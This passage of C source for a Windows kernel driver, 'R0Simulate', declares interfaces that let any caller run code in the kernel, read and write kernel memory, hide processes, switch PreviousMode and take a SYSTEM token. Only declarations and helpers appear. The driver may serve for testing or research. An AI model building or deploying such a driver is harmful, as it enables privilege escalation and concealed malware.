#define _CRT_SECURE_NO_WARNINGS
#include <ntifs.h>
#include <ntddk.h>
#include <ntstatus.h>
#include <ntimage.h>
#include <intrin.h>

#pragma warning(disable:4100 4189 4211 4819)

#define DEVICE_NAME     L"\\Device\\R0Simulate"
#define SYM_LINK_NAME   L"\\DosDevices\\R0Simulate"

#define IOCTL_R0SIMULATE_EXEC_INSTRUCTION           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_CALL_KERNEL_API            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_KERNEL_PROCESS_HIDING      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_PREVIOUS_MODE_SWITCH       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_KERNEL_OPEN_HANDLE         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_KERNEL_MEMORY_ACCESS       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_GET_SYSTEM_TOKEN           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_SET_INTERNAL_VARS          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_GET_KERNEL_FUNCTION        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_IO                         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define R0SIMULATE_FLAG_USE_ADDRESS  0x00000001
#define R0SPMS_MODE_KERNEL   0x00
#define R0SPMS_MODE_USER     0x01
#define R0SKPH_OP_ADD      0x10
#define R0SKPH_OP_REMOVE   0x11
#define R0SKPH_OP_LIST     0x12
#define R0SKMA_OP_READ     0
#define R0SKMA_OP_WRITE    1
#define PROCESS_QUERY_INFORMATION 0x0400

#define R0SIO_READ_BYTE     0x01
#define R0SIO_READ_WORD     0x02
#define R0SIO_READ_DWORD    0x03
#define R0SIO_WRITE_BYTE    0x11
#define R0SIO_WRITE_WORD    0x12
#define R0SIO_WRITE_DWORD   0x13

#define R0SIMULATE_VAR_OP_GET   0x01
#define R0SIMULATE_VAR_OP_SET   0x02
#define R0SIMULATE_VAR_OP_LIST  0x03

#define IOCTL_INDEX_EXEC_INSTRUCTION      0
#define IOCTL_INDEX_CALL_KERNEL_API       1
#define IOCTL_INDEX_PROCESS_HIDING        2
#define IOCTL_INDEX_PREVIOUS_MODE_SWITCH  3
#define IOCTL_INDEX_KERNEL_OPEN_HANDLE    4
#define IOCTL_INDEX_KERNEL_MEMORY_ACCESS  5
#define IOCTL_INDEX_GET_SYSTEM_TOKEN      6
#define IOCTL_INDEX_SET_INTERNAL_VARS     7
#define IOCTL_INDEX_GET_KERNEL_FUNCTION   8
#define IOCTL_INDEX_IO                    9

#define R0SKOH_TYPE_SHIFT      28
#define R0SKOH_TYPE_MASK       0xF0000000UL
#define R0SKOH_ATTR_MASK       0x0FFFFFFFUL
#define R0SKOH_TYPE_GET(f)     (((f) & R0SKOH_TYPE_MASK) >> R0SKOH_TYPE_SHIFT)
#define R0SKOH_ATTR_GET(f)     ((f) & R0SKOH_ATTR_MASK)
#define R0SKOH_TYPE_POINTER    0
#define R0SKOH_TYPE_PID        2

typedef struct _EXEC_INSTRUCTION_INPUT {
    ULONG   InstructionSize;
    UCHAR   Instruction[1];
} EXEC_INSTRUCTION_INPUT, *PEXEC_INSTRUCTION_INPUT;

typedef struct _EXEC_INSTRUCTION_OUTPUT {
    UINT64  ReturnValue;
    NTSTATUS Status;
} EXEC_INSTRUCTION_OUTPUT, *PEXEC_INSTRUCTION_OUTPUT;

typedef struct _CALL_KERNEL_API_INPUT {
    ULONG   ApiNameLength;
    ULONG   ArgumentCount;
    ULONG   Flags;
    UINT64  Arguments[16];
    WCHAR   ApiName[1];
} CALL_KERNEL_API_INPUT, *PCALL_KERNEL_API_INPUT;

typedef struct _CALL_KERNEL_API_OUTPUT {
    UINT64  ReturnValue;
    NTSTATUS Status;
} CALL_KERNEL_API_OUTPUT, *PCALL_KERNEL_API_OUTPUT;

typedef struct _PREVIOUS_MODE_SWITCH_INPUT {
    UCHAR   Mode;
    UCHAR   ViewOnly;
    UCHAR   Reserved[6];
} PREVIOUS_MODE_SWITCH_INPUT, *PPREVIOUS_MODE_SWITCH_INPUT;

typedef struct _PREVIOUS_MODE_SWITCH_OUTPUT {
    NTSTATUS Status;
    UCHAR    OldMode;
    UCHAR    NewMode;
} PREVIOUS_MODE_SWITCH_OUTPUT, *PPREVIOUS_MODE_SWITCH_OUTPUT;

typedef struct _PROCESS_HIDING_INPUT {
    UINT64  Address;
    ULONG   Length;
    UCHAR   Operation;
    UCHAR   Reserved[3];
} PROCESS_HIDING_INPUT, *PPROCESS_HIDING_INPUT;

typedef struct _HIDDEN_PROCESS_ENTRY {
    LIST_ENTRY ListEntry;
    HANDLE     ProcessId;
    PEPROCESS  EProcess;
} HIDDEN_PROCESS_ENTRY, *PHIDDEN_PROCESS_ENTRY;

typedef struct _KERNEL_MEMORY_ACCESS_INPUT {
    UINT64  Address;
    ULONG   Offset;
    ULONG   Length;
    UCHAR   Operation;
    UCHAR   Reserved[3];
    UCHAR   Data[1];
} KERNEL_MEMORY_ACCESS_INPUT, *PKERNEL_MEMORY_ACCESS_INPUT;

typedef struct _GET_SYSTEM_TOKEN_INPUT {
    UCHAR   ReplaceToken;
    UCHAR   Reserved[7];
} GET_SYSTEM_TOKEN_INPUT, *PGET_SYSTEM_TOKEN_INPUT;

typedef struct _GET_SYSTEM_TOKEN_OUTPUT {
    NTSTATUS Status;
    HANDLE   TokenHandle;
} GET_SYSTEM_TOKEN_OUTPUT, *PGET_SYSTEM_TOKEN_OUTPUT;

typedef struct _SET_INTERNAL_VAR_INPUT {
    ULONG   Operation;
    ULONG   VariableId;
    UINT64  Value;
    ULONG   NameLength;
    UCHAR   Reserved[4];
} SET_INTERNAL_VAR_INPUT, *PSET_INTERNAL_VAR_INPUT;

typedef struct _VAR_INFO {
    ULONG   Id;
    ULONG   Size;
    UINT64  Value;
    WCHAR   Name[64];
} VAR_INFO, *PVAR_INFO;

typedef struct _GET_KERNEL_FUNCTION_INPUT {
    ULONG   NameLength;
    WCHAR   Name[1];
} GET_KERNEL_FUNCTION_INPUT, *PGET_KERNEL_FUNCTION_INPUT;

typedef struct _KERNEL_FUNCTION_ENTRY {
    UINT64  Address;
    WCHAR   Name[64];
} KERNEL_FUNCTION_ENTRY, *PKERNEL_FUNCTION_ENTRY;

typedef struct _R0S_IO_INPUT {
    ULONG   Operation;
    ULONG   Port;
    ULONG   Value;
} R0S_IO_INPUT, *PR0S_IO_INPUT;

typedef struct _R0S_IO_OUTPUT {
    ULONG   Value;
    NTSTATUS Status;
} R0S_IO_OUTPUT, *PR0S_IO_OUTPUT;

typedef struct _FUNCTION_ENTRY {
    LIST_ENTRY ListEntry;
    UNICODE_STRING Name;
    PVOID Address;
} FUNCTION_ENTRY, *PFUNCTION_ENTRY;

typedef struct _SSDT_ENTRY {
    LIST_ENTRY ListEntry;
    ULONG      Ssn;
    UINT64     Address;
    WCHAR      Name[64];
} SSDT_ENTRY, *PSSDT_ENTRY;

typedef struct _SSDT_ENTRY_INFO {
    ULONG   Ssn;
    UINT64  Address;
    WCHAR   Name[64];
} SSDT_ENTRY_INFO, *PSSDT_ENTRY_INFO;

typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _NAME_MAP { ULONG Ssn; WCHAR Name[64]; } NAME_MAP;

typedef struct _KERNEL_OPEN_HANDLE_INPUT {
    ULONG       Flags;
    ACCESS_MASK DesiredAccess;
    UINT64      Target;
} KERNEL_OPEN_HANDLE_INPUT, *PKERNEL_OPEN_HANDLE_INPUT;

typedef struct _KERNEL_OPEN_HANDLE_OUTPUT {
    HANDLE      ResultHandle;
    ACCESS_MASK ActualGrantedAccess;
    NTSTATUS    Status;
} KERNEL_OPEN_HANDLE_OUTPUT, *PKERNEL_OPEN_HANDLE_OUTPUT;

typedef struct _VAR_TABLE_ENTRY {
    LIST_ENTRY ListEntry;
    ULONG      Id;
    ULONG      Size;
    PVOID      Address;
    WCHAR      Name[64];
} VAR_TABLE_ENTRY, *PVAR_TABLE_ENTRY;

PDEVICE_OBJECT  g_DeviceObject = NULL;
UNICODE_STRING  g_SymLinkName;
PDRIVER_OBJECT  g_DriverObject = NULL;
PVOID           g_OriginalUnload = NULL;
static LIST_ENTRY   g_HiddenListHead;
static KSPIN_LOCK   g_HiddenListLock;
static ULONG  g_PreviousModeOffset        = 0;
static ULONG  g_ActiveProcessLinksOffset  = 0;
static ULONG  g_PrimaryTokenFrozenOffset  = 0;
static ULONG  g_FunctionLookupMode        = 0;
static ULONG  g_GetFunctionMode           = 0;
static LIST_ENTRY   g_FunctionTableHead;
static KSPIN_LOCK   g_FunctionTableLock;
static BOOLEAN      g_FunctionTableBuilt = FALSE;
static LIST_ENTRY   g_SsdtListHead;
static KSPIN_LOCK   g_SsdtListLock;
static BOOLEAN      g_SsdtBuilt = FALSE;
static ULONG   g_IoctlDisable[10] = {0};
static ULONG   g_SecureMode       = 0;
static ULONG   g_IoctlCount[10]   = {0};
static ULONG   g_AntiKill         = 0;
static ULONG   g_IoctlTotalCount  = 0;
static UINT64  g_ReadAttrDescriptor  = 0;
static UINT64  g_WriteAttrDescriptor = 0;
static UINT64  g_HideAttrDescriptor  = 0;
static UINT64  g_DriverBase      = 0;
static ULONG   g_DriverSize      = 0;
static UINT64  g_IoctlHandler[10] = {0};
static LIST_ENTRY   g_VarTableHead;
static KSPIN_LOCK   g_VarTableLock;
static ULONG        g_VarNextId = 1;

NTKERNELAPI PPEB PsGetProcessPeb(PEPROCESS Process);
NTKERNELAPI NTSTATUS ZwOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
NTKERNELAPI NTSTATUS MmCopyVirtualMemory(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess,
                                         PVOID TargetAddress, SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);
NTKERNELAPI NTSTATUS ZwProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, SIZE_T *RegionSize,
                                            ULONG NewProtect, ULONG *OldProtect);
NTKERNELAPI NTSTATUS ZwQueryInformationToken(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
                                             PVOID TokenInformation, ULONG TokenInformationLength, ULONG *ReturnLength);
NTKERNELAPI NTSTATUS ZwSetInformationToken(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
                                           PVOID TokenInformation, ULONG TokenInformationLength);
NTKERNELAPI NTSTATUS ZwSetInformationProcess(HANDLE ProcessHandle, ULONG ProcessInformationClass,
                                             PVOID ProcessInformation, ULONG ProcessInformationLength);
NTSYSCALLAPI NTSTATUS NTAPI ZwQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation,
                                                     ULONG SystemInformationLength, ULONG *ReturnLength);
NTKERNELAPI NTSTATUS ZwOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
                                   POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
NTKERNELAPI NTSTATUS ZwDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle,
                                       PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
NTKERNELAPI NTSTATUS ZwDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess,
                                      POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly,
                                      TOKEN_TYPE TokenType, PHANDLE NewTokenHandle);
NTKERNELAPI NTSTATUS ZwClose(HANDLE Handle);
NTKERNELAPI BOOLEAN SeSinglePrivilegeCheck(LUID PrivilegeValue, KPROCESSOR_MODE PreviousMode);

NTSTATUS DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING);
VOID     DriverUnload(PDRIVER_OBJECT);
NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP);
NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP);

NTSTATUS InitDynamicOffsets(VOID);
NTSTATUS ExecuteInstruction(PEPROCESS, PVOID, ULONG, PUINT64);
NTSTATUS CallKernelApiInternal(PVOID, ULONG, UINT64*, PVOID, ULONG, PUINT64);
NTSTATUS LazyBuildFunctionTable(VOID);
NTSTATUS BuildSsdtTable(VOID);
NTSTATUS KernelOpenHandleInternal(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);
PSSDT_ENTRY FindSsdtBySsn(ULONG);
PSSDT_ENTRY FindSsdtByName(const WCHAR*);
BOOLEAN IsNumberString(const WCHAR*);
ULONG   WcharToUlong(const WCHAR*);
UINT64  ReadMsr(ULONG);
UINT64  FindKeServiceDescriptorTable(UINT64, SIZE_T);
PVOID   GetNtdllBase(PEPROCESS);
NAME_MAP* ParseNtdllExports(PVOID, PULONG);
BOOLEAN SafeReadMemory(PVOID, PVOID, SIZE_T);
BOOLEAN HasTcbPrivilege(VOID);
VOID    UpdateAntiKill(VOID);

static NTSTATUS         R0sRegisterVariable(ULONG, PVOID, const WCHAR*, ULONG*);
static PVAR_TABLE_ENTRY FindVarById(ULONG);
static PVAR_TABLE_ENTRY FindVarByName(const WCHAR*, ULONG);
static VOID             FreeVarTable(VOID);
static VOID             RegisterAllVariables(VOID);

static NTSTATUS PreviousModeSwitch(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
static NTSTATUS ProcessHiding(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
static NTSTATUS KernelMemoryAccess(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
static NTSTATUS GetSystemToken(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
static NTSTATUS SetInternalVariables(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
static NTSTATUS GetKernelFunction(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);
static NTSTATUS IoPortOperation(PVOID, ULONG, PVOID, ULONG, ULONG_PTR*);

static BOOLEAN R0sWcsEqI(const WCHAR*, const WCHAR*);
static VOID    R0sWcsCopyN(WCHAR*, const WCHAR*, ULONG);

typedef UINT64 (NTAPI *PFN_0)(VOID);
typedef UINT64 (NTAPI *PFN_1)(UINT64);
typedef UINT64 (NTAPI *PFN_2)(UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_3)(UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_4)(UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_5)(UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_6)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_7)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_8)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_9)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_10)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_11)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_12)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_13)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_14)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_15)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);
typedef UINT64 (NTAPI *PFN_16)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64);

static BOOLEAN R0sWcsEqI(const WCHAR* a, const WCHAR* b)
{
    BOOLEAN result = FALSE;
    __try {
        if (a != NULL && b != NULL) {
            ULONG i = 0;
            BOOLEAN match = TRUE;
            while (i < 256) {
                WCHAR ca = a[i];
                WCHAR cb = b[i];
                if (ca >= L'A' && ca <= L'Z') ca = (WCHAR)(ca + 32);
                if (cb >= L'A' && cb <= L'Z') cb = (WCHAR)(cb + 32);
                if (ca != cb) { match = FALSE; break; }
                if (ca == L'\0') break;
                i++;
            }
            result = match;
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        result = FALSE;
    }
    return result;
}

static VOID R0sWcsCopyN(WCHAR* dst, const WCHAR* src, ULONG maxChars)
{
    __try {
        ULONG i = 0;
        if (dst != NULL && maxChars > 0) {
            if (src != NULL) {
                while (i < maxChars - 1) {
                    WCHAR c = src[i];
                    if (c == L'\0') break;
                    dst[i] = c;
                    i++;
                }
            }
            dst[i] = L'\0';
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        if (dst != NULL && maxChars > 0) dst[0] = L'\0';
    }
}

static NTSTATUS R0sRegisterVariable(ULONG Size, PVOID Address, const WCHAR* Name, ULONG *pOutId)
{
    PVAR_TABLE_ENTRY pEntry = NULL;
    KIRQL oldIrql;

    if (Size == 0 || Size > sizeof(UINT64) || Address == NULL || Name == NULL)
        return STATUS_INVALID_PARAMETER;

    pEntry = (PVAR_TABLE_ENTRY)ExAllocatePoolWithTag(
        NonPagedPool, sizeof(VAR_TABLE_ENTRY), 'VREG');
    if (!pEntry) return STATUS_INSUFFICIENT_RESOURCES;

    RtlZeroMemory(pEntry, sizeof(VAR_TABLE_ENTRY));
    pEntry->Size    = Size;
    pEntry->Address = Address;
    R0sWcsCopyN(pEntry->Name, Name, 64);

    KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
    pEntry->Id = g_VarNextId++;
    InsertTailList(&g_VarTableHead, &pEntry->ListEntry);
    KeReleaseSpinLock(&g_VarTableLock, oldIrql);

    if (pOutId) *pOutId = pEntry->Id;
    return STATUS_SUCCESS;
}

static PVAR_TABLE_ENTRY FindVarById(ULONG Id)
{
    PVAR_TABLE_ENTRY found = NULL;
    KIRQL oldIrql;

    KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
    {
        PLIST_ENTRY p = g_VarTableHead.Flink;
        while (p != &g_VarTableHead) {
            PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
            if (e->Id == Id) { found = e; break; }
            p = p->Flink;
        }
    }
    KeReleaseSpinLock(&g_VarTableLock, oldIrql);
    return found;
}

static PVAR_TABLE_ENTRY FindVarByName(const WCHAR* Name, ULONG NameChars)
{
    WCHAR             nameBuf[64];
    ULONG             copyChars;
    BOOLEAN           copyOk = FALSE;
    PVAR_TABLE_ENTRY  found = NULL;
    KIRQL             oldIrql;

    if (!Name || NameChars == 0) return NULL;
    copyChars = (NameChars > 63) ? 63 : NameChars;

    __try {
        ULONG k;
        for (k = 0; k < copyChars; k++) nameBuf[k] = Name[k];
        nameBuf[copyChars] = L'\0';
        copyOk = TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        copyOk = FALSE;
    }

    if (!copyOk) return NULL;

    KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
    {
        PLIST_ENTRY p = g_VarTableHead.Flink;
        while (p != &g_VarTableHead) {
            PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
            if (R0sWcsEqI(e->Name, nameBuf)) { found = e; break; }
            p = p->Flink;
        }
    }
    KeReleaseSpinLock(&g_VarTableLock, oldIrql);
    return found;
}

static VOID FreeVarTable(VOID)
{
    KIRQL oldIrql;
    PLIST_ENTRY p;
    PLIST_ENTRY next;

    KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
    p = g_VarTableHead.Flink;
    while (p != &g_VarTableHead) {
        PVAR_TABLE_ENTRY e = CONTAINING_RECORD(p, VAR_TABLE_ENTRY, ListEntry);
        next = p->Flink;
        RemoveEntryList(p);
        KeReleaseSpinLock(&g_VarTableLock, oldIrql);
        ExFreePoolWithTag(e, 'VREG');
        KeAcquireSpinLock(&g_VarTableLock, &oldIrql);
        p = next;
    }
    KeReleaseSpinLock(&g_VarTableLock, oldIrql);
}

static VOID RegisterAllVariables(VOID)
{
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_PreviousModeOffset,       L"g_PreviousModeOffset",       NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_ActiveProcessLinksOffset, L"g_ActiveProcessLinksOffset", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_PrimaryTokenFrozenOffset, L"g_PrimaryTokenFrozenOffset", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_FunctionLookupMode,       L"g_FunctionLookupMode",       NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_GetFunctionMode,          L"g_GetFunctionMode",          NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[0], L"g_IoctlDisable[0]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[1], L"g_IoctlDisable[1]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[2], L"g_IoctlDisable[2]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[3], L"g_IoctlDisable[3]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[4], L"g_IoctlDisable[4]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[5], L"g_IoctlDisable[5]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[6], L"g_IoctlDisable[6]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[7], L"g_IoctlDisable[7]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[8], L"g_IoctlDisable[8]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlDisable[9], L"g_IoctlDisable[9]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_SecureMode, L"g_SecureMode", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[0], L"g_IoctlCount[0]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[1], L"g_IoctlCount[1]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[2], L"g_IoctlCount[2]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[3], L"g_IoctlCount[3]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[4], L"g_IoctlCount[4]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[5], L"g_IoctlCount[5]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[6], L"g_IoctlCount[6]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[7], L"g_IoctlCount[7]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[8], L"g_IoctlCount[8]", NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_IoctlCount[9], L"g_IoctlCount[9]", NULL);
    R0sRegisterVariable(sizeof(ULONG),  (PVOID)(ULONG_PTR)&g_AntiKill,        L"g_AntiKill",        NULL);
    R0sRegisterVariable(sizeof(ULONG),  (PVOID)(ULONG_PTR)&g_IoctlTotalCount, L"g_IoctlTotalCount", NULL);
    R0sRegisterVariable(sizeof(PVOID), (PVOID)(ULONG_PTR)&g_DeviceObject,   L"g_DeviceObject",   NULL);
    R0sRegisterVariable(sizeof(PVOID), (PVOID)(ULONG_PTR)&g_DriverObject,   L"g_DriverObject",   NULL);
    R0sRegisterVariable(sizeof(PVOID), (PVOID)(ULONG_PTR)&g_OriginalUnload, L"g_OriginalUnload", NULL);
    R0sRegisterVariable(sizeof(USHORT), (PVOID)(ULONG_PTR)&g_SymLinkName.Length,        L"g_SymLinkName.Length",        NULL);
    R0sRegisterVariable(sizeof(USHORT), (PVOID)(ULONG_PTR)&g_SymLinkName.MaximumLength, L"g_SymLinkName.MaximumLength", NULL);
    R0sRegisterVariable(sizeof(PVOID),  (PVOID)(ULONG_PTR)&g_SymLinkName.Buffer,        L"g_SymLinkName.Buffer",        NULL);
    R0sRegisterVariable(sizeof(PVOID), (PVOID)(ULONG_PTR)&g_HiddenListHead.Flink, L"g_HiddenListHead.Flink", NULL);
    R0sRegisterVariable(sizeof(PVOID), (PVOID)(ULONG_PTR)&g_HiddenListHead.Blink, L"g_HiddenListHead.Blink", NULL);
    R0sRegisterVariable(sizeof(PVOID), (PVOID)(ULONG_PTR)&g_HiddenListLock,       L"g_HiddenListLock",       NULL);
    R0sRegisterVariable(sizeof(PVOID),   (PVOID)(ULONG_PTR)&g_FunctionTableHead.Flink, L"g_FunctionTableHead.Flink", NULL);
    R0sRegisterVariable(sizeof(PVOID),   (PVOID)(ULONG_PTR)&g_FunctionTableHead.Blink, L"g_FunctionTableHead.Blink", NULL);
    R0sRegisterVariable(sizeof(PVOID),   (PVOID)(ULONG_PTR)&g_FunctionTableLock,       L"g_FunctionTableLock",       NULL);
    R0sRegisterVariable(sizeof(BOOLEAN), (PVOID)(ULONG_PTR)&g_FunctionTableBuilt,      L"g_FunctionTableBuilt",      NULL);
    R0sRegisterVariable(sizeof(PVOID),   (PVOID)(ULONG_PTR)&g_SsdtListHead.Flink, L"g_SsdtListHead.Flink", NULL);
    R0sRegisterVariable(sizeof(PVOID),   (PVOID)(ULONG_PTR)&g_SsdtListHead.Blink, L"g_SsdtListHead.Blink", NULL);
    R0sRegisterVariable(sizeof(PVOID),   (PVOID)(ULONG_PTR)&g_SsdtListLock,       L"g_SsdtListLock",       NULL);
    R0sRegisterVariable(sizeof(BOOLEAN), (PVOID)(ULONG_PTR)&g_SsdtBuilt,          L"g_SsdtBuilt",          NULL);
    R0sRegisterVariable(sizeof(PVOID), (PVOID)(ULONG_PTR)&g_VarTableHead.Flink, L"g_VarTableHead.Flink", NULL);
    R0sRegisterVariable(sizeof(PVOID), (PVOID)(ULONG_PTR)&g_VarTableHead.Blink, L"g_VarTableHead.Blink", NULL);
    R0sRegisterVariable(sizeof(PVOID), (PVOID)(ULONG_PTR)&g_VarTableLock,       L"g_VarTableLock",       NULL);
    R0sRegisterVariable(sizeof(ULONG), (PVOID)(ULONG_PTR)&g_VarNextId,          L"g_VarNextId",          NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_ReadAttrDescriptor,  L"g_ReadAttrDescriptor",  NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_WriteAttrDescriptor, L"g_WriteAttrDescriptor", NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_HideAttrDescriptor,  L"g_HideAttrDescriptor",  NULL);
    R0sRegisterVariable(sizeof(UINT64), (PVOID)(ULONG_PTR)&g_DriverBase,      L"g_DriverBase",      NULL);
    R0sRegisterVariable(sizeof(ULONG),  (PVOID)(ULONG_PTR)&g_DriverSize,      L"g_DriverSize",      NULL);
